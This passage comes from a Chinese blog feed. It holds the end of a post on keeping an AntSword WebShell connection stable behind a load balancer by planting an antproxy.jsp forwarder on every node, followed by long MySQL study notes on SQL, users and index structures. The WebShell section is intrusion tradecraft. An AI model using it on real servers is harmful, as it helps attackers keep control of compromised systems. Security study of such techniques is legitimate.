上。</p>\n<p><strong>b)</strong> 要保证每一台 Node 上都有相同路径的 antproxy.jsp, 所以我疯狂保存了很多次，保证每一台都上传了脚本</p>\n<p>保存的一些小技巧</p>\n<p>比如像改修 127.21.0.3 变为 172.21.0.2，需要连续两次在同一个页面修改为.2，连续保存两次</p>\n<p>第二次修改的时候已经是.2 了，你先随便改改，然后改回.2 在保存，这样能省很多事</p>\n<p><strong>2. 修改 Shell 配置，将 URL 部分填写为 antproxy.jsp 的地址，其它配置不变</strong></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221225183112937.png\" alt=\"image-20221225183112937\"></p>\n<p><strong>3. 测试执行命令，查看 IP</strong></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221225183137011.png\" alt=\"image-20221225183137011\"></p>\n<p>可以看到 IP 已经固定，意味着请求已经固定到了 LBSNode1 这台机器上了。此时使用分片上传、HTTP 代理，都已经跟单机的情况没什么区别了。</p>\n<p>Node1 和 Node2 交叉着访问 Node1 的 /ant.jsp 文件，符合 nginx 此时的 LBS 策略。</p>\n<p><strong>优点：</strong></p>\n<ul>\n<li>低权限就可以完成，如果权限高的话，还可以通过端口层面直接转发，不过这跟 Plan A 的关服务就没啥区别了</li>\n<li>流量上，只影响访问 WebShell 的请求，其它的正常业务请求不会影响。</li>\n<li>适配更多工具</li>\n</ul>\n<p><strong>缺点：</strong></p>\n<ul>\n<li>该方案需要「目标 Node」和「其它 Node」 之间内网互通，如果不互通就凉了（敲黑板：加固方案快记下来）</li>\n</ul>\n<p>如果你的蚁剑不能连接 jsp，那就升级～</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvNEJtel9mdXUweXJMTUsxb0JLS3RSQQ==\">负载均衡下的 WebShell 连接 (qq.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0FudFN3b3JkUHJvamVjdC9BbnRTd29yZC1MYWJz\">AntSwordProject/AntSword-Labs: Awesome environment for antsword tests (github.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl82MDcxOTc4MC9hcnRpY2xlL2RldGFpbHMvMTI4MjM5NzY3\">负载均衡反向代理下的 webshell_奋斗的小智的博客 - CSDN 博客</span></p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/12/28/mysql/",
            "url": "http://example.com/2022/12/28/mysql/",
            "title": "Mysql",
            "date_published": "2022-12-28T05:38:45.000Z",
            "content_html": "<h1 id=\"mysql\"><a class=\"markdownIt-Anchor\" href=\"#mysql\">#</a> MySQL</h1>\n<p>公钥加密，私钥解密→加密</p>\n<p>私钥加密，公钥解密→签名</p>\n<p>mysql 常见错误</p>\n<blockquote>\n<p>1044：当前用户没有访问数据库的权限</p>\n<p>1045 密码错误</p>\n<p>1065 无效的 SQL 语句，SQL 语句为空</p>\n<p>1180 提交事务失败</p>\n<p>1181 回滚事务失败</p>\n<p>2002 数据库没有启动或者是端口被防火墙禁止</p>\n<p>2003 错误不开放外链</p>\n</blockquote>\n<p>innodb 行锁 &gt;5.5</p>\n<p>MyISAM 表锁</p>\n<p>utf8mb4 四子节</p>\n<p>utf8 三子节 可能导致截断产生 xss</p>\n<p>模糊匹配变量名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">show variables like “%character%”</span><br></pre></td></tr></table></figure>\n<p>本地变量只在当前窗口生效</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set session var = bbb;</span><br></pre></td></tr></table></figure>\n<p>全局变量在所有窗口生效</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set global var = aaa;</span><br></pre></td></tr></table></figure>\n<p>查看密码 5.5 以后 password 字段变为 authentication_string</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select host,password,user from mysql.user;</span><br><span class=\"line\">mysql&gt; select host,password,user from mysql.user;</span><br><span class=\"line\">+-----------+-------------------------------------------+---------+</span><br><span class=\"line\">| host      | password                                  | user    |</span><br><span class=\"line\">+-----------+-------------------------------------------+---------+</span><br><span class=\"line\">| localhost | *FAAFFE644E901CFAFAEC7562415E5FAEC243B8B2 | root    |</span><br><span class=\"line\">| 127.0.0.1 | *FAAFFE644E901CFAFAEC7562415E5FAEC243B8B2 | root    |</span><br><span class=\"line\">| ::1       | *FAAFFE644E901CFAFAEC7562415E5FAEC243B8B2 | root    |</span><br><span class=\"line\">| localhost |                                           |         |</span><br><span class=\"line\">| localhost | *FAAFFE644E901CFAFAEC7562415E5FAEC243B8B2 | root123 |</span><br><span class=\"line\">| 127.0.0.1 | *FAAFFE644E901CFAFAEC7562415E5FAEC243B8B2 | root123 |</span><br><span class=\"line\">+-----------+-------------------------------------------+---------+</span><br></pre></td></tr></table></figure>\n<p>创建用户</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create user &#x27;llisi&#x27;@&#x27;localhost&#x27;identified by &#x27;123456&#x27;;</span><br><span class=\"line\">grant all on sec.* to &#x27;root&#x27;@&#x27;%&#x27; identified by &#x27;123456&#x27;;</span><br></pre></td></tr></table></figure>\n<p>给用户加远程登录权限时必须在配置文件中修改 bindip</p>\n<p>mysql.user 在新版中是一个视图，不能直接 insert 来新建用户。如果设置严格模式也可能导致 insert 插入用户失败</p>\n<p>修改密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Alert user ‘root’@‘localhost’ identified by ‘passed’</span><br></pre></td></tr></table></figure>\n<p>删除用户</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">drop user aaa@localhost</span><br></pre></td></tr></table></figure>\n<p>创建数据库</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create database if not exist test;</span><br><span class=\"line\">drop database if exist test</span><br></pre></td></tr></table></figure>\n<p>查看建库语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">show create database dbs;</span><br></pre></td></tr></table></figure>\n<p>创建表</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create table if not exists yanchuang (</span><br><span class=\"line\">id int(5) unsigned not null primary key auto_increment，</span><br><span class=\"line\">name varchar(4)</span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure>\n<p>varchar 后的数字代表显示字符长度，如果开启严格模式会报错 1406，关闭后插入的字符会缺失</p>\n<p>int 后的数字必须配合 zerofill 使用，使用后代表最小的位数，如果不够用 0 填充的 int 后面的数字位数</p>\n<p>插入数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">insert into test (name,age) values (haha,123);</span><br><span class=\"line\">insert into test set name=&quot;aaa&quot;,age=100;</span><br></pre></td></tr></table></figure>\n<h2 id=\"索引\"><a class=\"markdownIt-Anchor\" href=\"#索引\">#</a> 索引</h2>\n<p><strong>索引的出现其实就是为了提高数据查询的效率，就像书的目录一样</strong>。</p>\n<h3 id=\"索引常见模型\"><a class=\"markdownIt-Anchor\" href=\"#索引常见模型\">#</a> 索引常见模型</h3>\n<p>三种常见、也比较简单的数据结构，<strong>它们分别是哈希表、有序数组和搜索树</strong>。</p>\n<h4 id=\"哈希表\"><a class=\"markdownIt-Anchor\" href=\"#哈希表\">#</a> 哈希表</h4>\n<p><strong>哈希表是一种以键 - 值（key-value）存储数据的结构，我们只要输入待查找的键即 key，就可以找到其对应的值即 Value</strong>。哈希的思路很简单，把值放在数组里，用一个哈希函数把 key 换算成一个确定的位置，然后把 value 放在数组的这个位置。</p>\n<p>你现在维护着一个身份证信息和姓名的表，需要根据身份证号查找对应的名字，这时对应的哈希索引的示意图</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/0c62b601afda86fe5d0fe57346ace957.png\" alt=\"img\"></p>\n<p>将 ID_card_n2 通过哈希函数算出 N；然后，按顺序遍历，找到 User2。</p>\n<p>四个 ID_card_n 的值并不是递增的，这样做的好处是增加新的 User 时速度会很快，只需要往后追加。但缺点是，因为不是有序的，所以哈希索引做区间查询的速度是很慢的。</p>\n<p>所以，<strong>哈希表这种结构适用于只有等值查询的场景</strong>，比如 Memcached 及其他一些 NoSQL 引擎。key-value</p>\n<p>比如 select * from users where name=“aaa”;</p>\n<h4 id=\"有序数组\"><a class=\"markdownIt-Anchor\" href=\"#有序数组\">#</a> 有序数组</h4>\n<p><strong>有序数组在等值查询和范围查询场景中的性能就都非常优秀</strong>。</p>\n<p>这里我们假设身份证号没有重复，这个数组就是按照身份证号递增的顺序保存的。这时候如果你要查 ID_card_n2 对应的名字，用二分法就可以快速得到，这个时间复杂度是 O (log (N))。</p>\n<p>同时很显然，这个索引结构支持范围查询。你要查身份证号在 [ID_card_X, ID_card_Y] 区间的 User，可以先用二分法找到 ID_card_X（如果不存在 ID_card_X，就找到大于 ID_card_X 的第一个 User），然后向右遍历，直到查到第一个大于 ID_card_Y 的身份证号，退出循环。</p>\n<p>但是，在需要更新数据的时候就麻烦了，你往中间插入一个记录就必须得挪动后面所有的记录，成本太高。</p>\n<p>所以，<strong>有序数组索引只适用于静态存储引擎</strong>，比如你要保存的是 2017 年某个城市的所有人口信息，这类不会再修改的数据。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/bfc907a92f99cadf5493cf0afac9ca49.png\" alt=\"img\"></p>\n<h4 id=\"二叉搜索树\"><a class=\"markdownIt-Anchor\" href=\"#二叉搜索树\">#</a> 二叉搜索树</h4>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/04fb9d24065635a6a637c25ba9ddde68.png\" alt=\"img\"></p>\n<p>父节点左子树所有结点的值小于父节点的值，右子树所有结点的值大于父节点的值。这样如果你要查 ID_card_n2 的话，<strong>按照图中的搜索顺序就是按照 UserA -&gt; UserC -&gt; UserF -&gt; User2 这个路径得到。这个时间复杂度是 O (log (N))。</strong></p>\n<p>树可以有二叉，也可以有多叉。多叉树就是每个节点有多个儿子，儿子之间的大小保证从左到右递增。二叉树是搜索效率最高的，但是实际上大多数的数据库存储却并不使用二叉树。其原因是，索引不止存在内存中，还要写到磁盘上。</p>\n<p>一棵 100 万节点的平衡二叉树，树高 20。一次查询可能需要访问 20 个数据块。在机械硬盘时代，从磁盘随机读一个数据块需要 10 ms 左右的寻址时间。也就是说，对于一个 100 万行的表，如果使用二叉树来存储，单独访问一个行可能需要 20 个 10 ms 的时间，这个查询可真够慢的。</p>\n<p>（2 ** 20）= 1048576</p>\n<p><strong>为了让一个查询尽量少地读磁盘，就必须让查询过程访问尽量少的数据块。那么，我们就不应该使用二叉树，而是要使用 “N 叉” 树。这里，“N 叉” 树中的 “N” 取决于数据块的大小。</strong></p>\n<p>以 InnoDB 的一个整数字段索引为例，这个 N 差不多是 1200 (<strong>MySql 默认一个存储页面的大小为 16K，一个整数（bigint）字段索引的长度为 8B, 另外每个索引还跟着 6B 的指向其子树的指针；所以 16K/14B ≈ 1170</strong>)。这棵树高是 3 的时候，就可以存 1200 的 2 次方个值，这已经 8 亿了。考虑到树根的数据块总是在内存中的，一个 8 亿行的表上一个整数字段的索引，查找一个值最多只需要访问 3 次磁盘。其实，树的第二层也有很大概率在内存中，那么访问磁盘的平均次数就更少了。</p>\n<h4 id=\"b-tree\"><a class=\"markdownIt-Anchor\" href=\"#b-tree\">#</a> B-tree</h4>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1383365-20190131112848755-208066245.png\" alt=\"img\"></p>\n<p>由于每个节点还是存储数据，还是需要访问磁盘</p>\n<h4 id=\"btree\"><a class=\"markdownIt-Anchor\" href=\"#btree\">#</a> B+tree</h4>\n<p>InnoDB 存储引擎就是用 B+Tree 实现其索引结构。</p>\n<blockquote>\n<p>B+Tree 相对于 B-Tree 有几点不同：</p>\n<ol>\n<li>B + 节点关键字搜索采用闭合区间</li>\n<li>B+<strong> 非叶节点不保存数据相关信息</strong>，只保存关键字和子节点的引用</li>\n<li>B + 关键字对应的数据保存在叶子节点中</li>\n<li>B + 叶子节点是顺序排列的，并且相邻节点具有顺序引用的关系</li>\n</ol>\n</blockquote>\n<p>B+Tree 是在 B-Tree 基础上的一种优化，使其更适合实现外存储索引结构，InnoDB 存储引擎就是用 B+Tree 实现其索引结构。只有叶子节点才存放数据</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1383365-20190131125319027-1361502032.png\" alt=\"img\"></p>\n<p>B + 以页为单位，1 页 = 16kb，可以修改 innodb_page_size，只能在初始化时修改，即需要删除 ibdata1 和 ib_logfile0</p>\n<p>添加索引 index，key</p>\n<p>key 定义主键索引，一个表中只能有一个主键，一个主键可以包含多个字段</p>\n<p>index 定义索引</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">primary key(id),</span><br></pre></td></tr></table></figure>\n<p><code>index idx_name (name)</code>  其作用和 <code>key ind_name(name)</code>  相同</p>\n<p>删除主键索引需要先删除 auto_increment，再删除主键索引</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">alter table chenke change id id int unsigned not null</span><br><span class=\"line\">alter table chenke drop primary key</span><br><span class=\"line\">desc chenke </span><br></pre></td></tr></table></figure>\n<p>约束信息可以在 information_schema 表中查看</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from information_schema.key_column_usage where table_name=&#x27;test1&#x27;;</span><br></pre></td></tr></table></figure>\n<p>创建索引</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create index ind on test (id,name)    //</span><br><span class=\"line\">create index ind on test (id,name(5)) //以前五个字符当做索引，称为最左前缀索引</span><br><span class=\"line\"></span><br><span class=\"line\">index index_name (`name`,`gender`,`age`) //name在最左</span><br></pre></td></tr></table></figure>\n<p>explain 查看是否命中索引，用于分析语句效率</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">explain seelct * from stu where gender=1</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221116110850137.png\" alt=\"image-20221116110850137\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221116110935205.png\" alt=\"image-20221116110935205\"></p>\n<h3 id=\"innodb索引模型\"><a class=\"markdownIt-Anchor\" href=\"#innodb索引模型\">#</a> InnoDB 索引模型</h3>\n<p>在 InnoDB 中，表都是根据主键顺序以索引的形式存放的，这种存储方式的表称为索引组织表。又因为前面我们提到的，InnoDB 使用了 B+ 树索引模型，所以数据都是存储在 B+ 树中的。</p>\n<blockquote>\n<p>mysql&gt; create table T(</p>\n<p>id int primary key,</p>\n<p>k int not null,</p>\n<p>name varchar(16),</p>\n<p>index (k))engine=InnoDB;</p>\n</blockquote>\n<p>根据叶子节点的内容，索引类型分为主键索引和非主键索引。</p>\n<p><strong>主键索引的叶子节点存的是整行数据。在 InnoDB 里，主键索引也被称为聚簇索引（clustered index）。</strong></p>\n<p><strong>非主键索引的叶子节点内容是主键的值。在 InnoDB 里，非主键索引也被称为二级索引（secondary index）。</strong></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/dcda101051f28502bd5c4402b292e38d.png\" alt=\"img\"></p>\n<p><strong>如果语句是 select * from T where ID=500，即主键查询方式，则只需要搜索 ID 这棵 B+ 树；</strong></p>\n<p><strong>如果语句是 select * from T where k=5，即普通索引查询方式，则需要先搜索 k 索引树，得到 ID 的值为 500，再到 ID 索引树搜索一次。这个过程称为回表。</strong></p>\n<p>也就是说，基于非主键索引的查询需要多扫描一棵索引树。因此，我们在应用中应该尽量使用主键查询。</p>\n<h3 id=\"最左前缀索引\"><a class=\"markdownIt-Anchor\" href=\"#最左前缀索引\">#</a> 最左前缀索引</h3>\n<p>为了直观地说明这个概念，我们用（name，age）这个联合索引来分析</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/89f74c631110cfbc83298ef27dcd6370.jpg\" alt=\"img\"></p>\n<p>可以看到，索引项是按照索引定义里面出现的字段顺序排序的。</p>\n<p>如果你要查的是所有名字第一个字是 “张” 的人，你的 SQL 语句的条件是 &quot;where name like ‘张 %’&quot;。这时，你也能够用上这个索引，查找到第一个符合条件的记录是 ID3，然后向后遍历，直到不满足条件为止。</p>\n<p>可以看到，不只是索引的全部定义，只要满足最左前缀，就可以利用索引来加速检索。这个最左前缀可以是联合索引的最左 N 个字段，也可以是字符串索引的最左 M 个字符。</p>\n<p>必须要有最左前缀在查询中，即使用索引，因为 mysql 查询时会优化，将最左前缀放到最前面</p>\n<p>假设，你现在维护一个支持邮箱登录的系统，用户表是这么定义的：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; create table SUser(</span><br><span class=\"line\">ID bigint unsigned primary key,</span><br><span class=\"line\">email varchar(64), </span><br><span class=\"line\">username varchar(100)</span><br><span class=\"line\">)engine=innodb; </span><br></pre></td></tr></table></figure>\n<p>由于要使用邮箱登录，所以业务代码中一定会出现类似于这样的语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select f1, f2 from SUser where email=&#x27;xxx&#x27;;</span><br></pre></td></tr></table></figure>\n<p>如果 email 这个字段上没有索引，那么这个语句就只能做全表扫描。</p>\n<p>比如，这两个在 email 字段上创建索引的语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; alter table SUser add index index2(email);</span><br><span class=\"line\">mysql&gt; alter table SUser add index index2(email(6));</span><br><span class=\"line\">由于 email(6) 这个索引结构中每个邮箱字段都只取前 6 个字节（即：zhangs），所以占用的空间会更小，这就是使用前缀索引的优势。</span><br></pre></td></tr></table></figure>\n<p>如果拿整个邮箱做索引</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/d31da662bee595991862c439a5567eb7.jpg\" alt=\"img\"></p>\n<p>email (6) 索引结构</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/134583875561de914991fc2e192cf842.jpg\" alt=\"img\"></p>\n<p>从图中你可以看到，由于 email (6) 这个索引结构中每个邮箱字段都只取前 6 个字节（即：zhangs），所以占用的空间会更小，这就是使用前缀索引的优势。</p>\n<p><strong>如果使用的是 index1</strong>（即 email 整个字符串的索引结构），执行顺序是这样的：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">从 index1 索引树找到满足索引值是’zhangssxyz@xxx.com’的这条记录，取得 ID2 的值；</span><br><span class=\"line\">到主键上查到主键值是 ID2 的行，判断 email 的值是正确的，将这行记录加入结果集；</span><br><span class=\"line\">取 index1 索引树上刚刚查到的位置的下一条记录，发现已经不满足 email=&#x27;zhangssxyz@xxx.com’的条件了，循环结束。</span><br><span class=\"line\">这个过程中，只需要回主键索引取一次数据，所以系统认为只扫描了一行。</span><br></pre></td></tr></table></figure>\n<p><strong>如果使用的是 index2</strong>（即 email (6) 索引结构），执行顺序是这样的：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">从 index2 索引树找到满足索引值是’zhangs’的记录，找到的第一个是 ID1；</span><br><span class=\"line\">到主键上查到主键值是 ID1 的行，判断出 email 的值不是’zhangssxyz@xxx.com’，这行记录丢弃；</span><br><span class=\"line\">取 index2 上刚刚查到的位置的下一条记录，发现仍然是’zhangs’，取出 ID2，再到 ID 索引上取整行然后判断，这次值对了，将这行记录加入结果集；</span><br><span class=\"line\">重复上一步，直到在 idxe2 上取到的值不是’zhangs’时，循环结束。</span><br><span class=\"line\">在这个过程中，要回主键索引取 4 次数据，也就是扫描了 4 行。</span><br><span class=\"line\">通过这个对比，你很容易就可以发现，使用前缀索引后，可能会导致查询语句读数据的次数变多。</span><br><span class=\"line\">但是，对于这个查询语句来说，如果你定义的 index2 不是 email(6) 而是 email(7），也就是说取 email 字段的前 7 个字节来构建索引的话，即满足前缀’zhangss’的记录只有一个，也能够直接查到 ID2，只扫描一行就结束了。</span><br></pre></td></tr></table></figure>\n<p>也就是说<strong>使用前缀索引，定义好长度，就可以做到既节省空间，又不用额外增加太多的查询成本。</strong></p>\n<p>实际上，我们在建立索引时关注的是区分度，区分度越高越好。因为区分度越高，意味着重复的键值越少。因此，我们可以通过统计索引上有多少个不同的值来判断要使用多长的前缀。</p>\n<p>首先，你可以使用下面这个语句，算出这个列上有多少个不同的值：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select count(distinct email) as L from SUser;</span><br></pre></td></tr></table></figure>\n<p>然后，依次选取不同长度的前缀来看这个值，比如我们要看一下 4~7 个字节的前缀索引，可以用这个语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select </span><br><span class=\"line\">  count(distinct left(email,4)）as L4,</span><br><span class=\"line\">  count(distinct left(email,5)）as L5,</span><br><span class=\"line\">  count(distinct left(email,6)）as L6,</span><br><span class=\"line\">  count(distinct left(email,7)）as L7,</span><br><span class=\"line\">from SUser;</span><br></pre></td></tr></table></figure>\n<p>当然，使用前缀索引很可能会损失区分度，所以你需要预先设定一个可以接受的损失比例，比如 5%。然后，在返回的 L4~L7 中，找出不小于 L * 95% 的值，假设这里 L6、L7 都满足，你就可以选择前缀长度为 6。</p>\n<p><strong>使用前缀索引就用不上覆盖索引对查询性能的优化了，这也是你在选择是否使用前缀索引时需要考虑的一个因素</strong>。</p>\n<h3 id=\"索引下推\"><a class=\"markdownIt-Anchor\" href=\"#索引下推\">#</a> 索引下推</h3>\n<p>我们还是以市民表的联合索引（name, age）为例。</p>\n<p>如果现在有一个需求：检索出表中 “名字第一个字是张，而且年龄是 10 岁的所有男孩”。那么，SQL 语句是这么写的：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from tuser where name like &#x27;张%&#x27; and age=10 and ismale=1;</span><br></pre></td></tr></table></figure>\n<p>这个语句在搜索索引树的时候，只能用 “张”，找到第一个满足条件的记录 ID3。然后判断其他条件是否满足。</p>\n<p>在 MySQL 5.6 之前，只能从 ID3 开始一个个回表。到主键索引上找出数据行，再对比字段值。</p>\n<p>MySQL 5.6 引入的索引下推优化（index condition pushdown)， 可以在索引遍历过程中，对索引中包含的字段先做判断，直接过滤掉不满足条件的记录，减少回表次数。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/b32aa8b1f75611e0759e52f5915539ac.jpg\" alt=\"img\"></p>\n<p>区别是，InnoDB 在 (name,age) 索引内部就判断了 age 是否等于 10，对于不等于 10 的记录，直接判断并跳过。在我们的这个例子中，只需要对 ID4、ID5 这两条记录回表取数据判断，就只需要回表 2 次。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/76e385f3df5a694cc4238c7b65acfe1b.jpg\" alt=\"img\"></p>\n<p>当创建 (a,b,c) 复合索引时，想要索引生效的话，只能使用 a 和 ab、ac 和 abc 三种组合</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt;SELECT `a`,`b`,`c` FROM A WHERE `a`=&#x27;a1&#x27; ; //索引生效</span><br><span class=\"line\">mysql&gt;SELECT `a`,`b`,`c` FROM A WHERE `b`=&#x27;b2&#x27; AND `c`=&#x27;c2&#x27;; //索引失效</span><br><span class=\"line\">mysql&gt;SELECT `a`,`b`,`c` FROM A WHERE `a`=&#x27;a3&#x27; AND `c`=&#x27;c3&#x27;; //索引生效，实际上值使用了索引a</span><br></pre></td></tr></table></figure>\n<p>三个字段联合索引测试</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create table `user` (</span><br><span class=\"line\">`id` int(11) not null,</span><br><span class=\"line\">`name` varchar(45) default null,</span><br><span class=\"line\">`sex` varchar(45) default null,</span><br><span class=\"line\">`age` varchar(45) default null,</span><br><span class=\"line\">key `index_test` (`sex`,`age`,`name`) using btree</span><br><span class=\"line\">)ENGINE=InndDB DEFAULT charset=utf8mb4;</span><br></pre></td></tr></table></figure>\n<p>联合索引的顺序为：sex，age，name</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SELECT * FROM user where age=&quot;4&quot;; #未使用索引</span><br><span class=\"line\">SELECT * FROM user where name=&quot;2&quot;; #未使用索引</span><br><span class=\"line\">SELECT * FROM user where sex=&quot;2&quot; and age=&quot;3&quot;; #使用索引</span><br><span class=\"line\">SELECT * FROM user where sex=&quot;2&quot; and age=&quot;3&quot; and name=&quot;4&quot;; #使用索引</span><br><span class=\"line\">SELECT * FROM user where age=&quot;3&quot; and name=&quot;4&quot;;  #未使用索引</span><br><span class=\"line\">SELECT * FROM user where sex=&quot;2&quot; and name=&quot;4&quot;;  #使用索引</span><br></pre></td></tr></table></figure>\n<p>两个字段测试</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create table `user` (</span><br><span class=\"line\">`id` int(11) not null,</span><br><span class=\"line\">`name` varchar(45) default null,</span><br><span class=\"line\">`sex` varchar(45) default null,</span><br><span class=\"line\">`age` varchar(45) default null,</span><br><span class=\"line\">key `index_test` (`sex`,`age`) using btree</span><br><span class=\"line\">)ENGINE=InndDB DEFAULT charset=utf8mb4;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 